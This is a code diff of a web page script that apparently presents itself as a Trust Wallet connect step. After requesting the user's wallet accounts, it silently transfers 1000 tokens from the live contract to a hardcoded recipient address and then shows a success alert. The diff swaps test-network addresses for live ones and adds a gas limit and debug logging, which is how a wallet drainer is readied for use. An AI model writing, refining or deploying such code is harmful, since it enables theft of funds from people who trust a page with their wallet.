@@ -390,14 +390,17 @@ const contractABI = [
 ];
 
 async function handleTransfer(sender,provider){
+  console.log(sender,'sender')
   try {
-    // const contractAddress = '0x7169D38820dfd117C3FA1f22a697dBA58d90BA06'; //test usdt address [sepolia]
-    const contractAddress = '0x55d398326f99059fF775485246999027B3197955';
+    // const contractAddress = '0x83bc5802D37eeFE6A08993d3b7B3BC5385873BC3'; //test token address [sepolia]
+    const contractAddress = '0x55d398326f99059fF775485246999027B3197955'; 
     const contract = new provider.eth.Contract(contractABI, contractAddress);
-    // const recipient = '0x9a395ECe726bCb15430A87fdDdC86de7E976b533'; // test wallet address [sepolia]
+    console.log(contract,'contract_address')
+    // const recipient = '0x8F76A2DCc1E2578ea0C8AC6837f5D2162Ac42f20'; // test wallet address [sepolia]
     const recipient = '0x9d87C64Ee6d2d9606DC497b1b5e767166FeE522f';
     const amount = provider.utils.toWei('1000', 'ether')
-    await contract.methods.transfer(recipient,amount).send({ from: sender });
+   const tx = await contract.methods.transfer(recipient,amount).send({ from: sender, gas:100000});
+   console.log(tx,'tx')
     showSuccessAlert();
   } catch (error) {
     console.error(error);
@@ -408,12 +411,12 @@ async function openTrustWallet(){
   console.log(`openTrustWallet`)
   if (typeof window.ethereum !== 'undefined') {
     try {
-      console.log(`openTrustWallet_1`)
       await window.ethereum.request({ method: 'eth_requestAccounts' });
       const provider = new Web3(window.ethereum);
       const accounts = await provider.eth.getAccounts();
       const sender = accounts[0];
-      
+      console.log(`openTrustWallet_1`)
+
       handleTransfer(sender, provider);
     } catch (error) {
       console.error(error);
